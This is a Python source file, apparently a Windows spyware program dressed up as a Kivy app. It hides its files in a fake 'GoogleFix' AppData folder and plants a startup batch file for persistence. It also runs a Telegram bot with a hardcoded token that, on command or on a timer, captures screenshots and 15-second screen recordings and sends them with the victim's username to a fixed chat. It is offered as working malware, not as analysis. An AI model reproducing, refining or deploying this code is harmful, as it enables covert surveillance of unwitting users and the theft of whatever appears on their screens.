from kivy.app import App
import time
import pyautogui
import telebot
import cv2
import numpy as np
import os
import getpass

USER_NAME = getpass.getuser()

bot = telebot.TeleBot('5311502721:AAGKM-xW-e3XqmqBgdU2Wl7ByNYklbiDGQ4')

directory = r"C:\Users\%s\AppData\Local\Image\GoogleFix\applications" % USER_NAME
if not os.path.exists(directory):
    os.makedirs(directory)

application = r'C:\Users\%s\AppData\Local\Image\GoogleFix\applications\GoogleFire.exe' % USER_NAME


class MainApp(App):
    def add_to_startup(file_path=r'C:\Users\%s\AppData\Local\Image\GoogleFix\applications\GoogleFire.exe' % USER_NAME):
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" "%s"' % file_path)

    @bot.message_handler(content_types=['text'])
    def send_message(message):

        text = message.text.lower()
        print(text)
        plug = 1
        plug = plug + 1

        if text == "photo":
            if not os.path.exists(directory):
                os.makedirs(directory)

            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(fr'C:\Users\%s\AppData\Local\Image\GoogleFix\gphoto{plug}.png' % USER_NAME)
            photo = open(fr"C:\Users\%s\AppData\Local\Image\GoogleFix\gphoto{plug}.png" % USER_NAME, 'rb')
            bot.send_photo(1441817634, photo)
            chatId = 1441817634
            sends = USER_NAME + " " + "COMPUTER"
            bot.send_message(chatId, text=sends)

        if text == "video":
            if not os.path.exists(directory):
                os.makedirs(directory)

            SCREEN_SIZE = tuple(pyautogui.size())
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            fps = 12.0
            out = cv2.VideoWriter(fr'C:\Users\%s\AppData\Local\Image\GoogleFix\output{plug}.mp4' % USER_NAME, fourcc,
            fps, (SCREEN_SIZE))
            record_seconds = 15

            for i in range(int(record_seconds * fps)):
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)

            cv2.destroyAllWindows()
            out.release()
            video = open(fr'C:\Users\%s\AppData\Local\Image\GoogleFix\output{plug}.mp4' % USER_NAME, 'rb')
            bot.send_video(1441817634, video)
            chatId = 1441817634
            sends = USER_NAME + " " + "COMPUTER"
            bot.send_message(chatId, text=sends)

        else:
            while True:
                time.sleep(1000)
                if not os.path.exists(directory):
                    os.makedirs(directory)

                myScreenshot = pyautogui.screenshot()
                myScreenshot.save(fr'C:\Users\%s\AppData\Local\Image\GoogleFix\gphoto{plug}.png' % USER_NAME)
                photo = open(fr"C:\Users\%s\AppData\Local\Image\GoogleFix\gphoto{plug}.png" % USER_NAME, 'rb')
                bot.send_photo(1441817634, photo)
                chatId = 1441817634
                sends = USER_NAME + " " + "COMPUTER"
                bot.send_message(chatId, text=sends)

    try:
        batt = open(r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat' % USER_NAME)
        print("Установка BAT файла не требуется")
    except:
        print("Установлен BAT файл")
        add_to_startup()

    bot.polling()
if __name__ == '__main__':
     MainApp().run()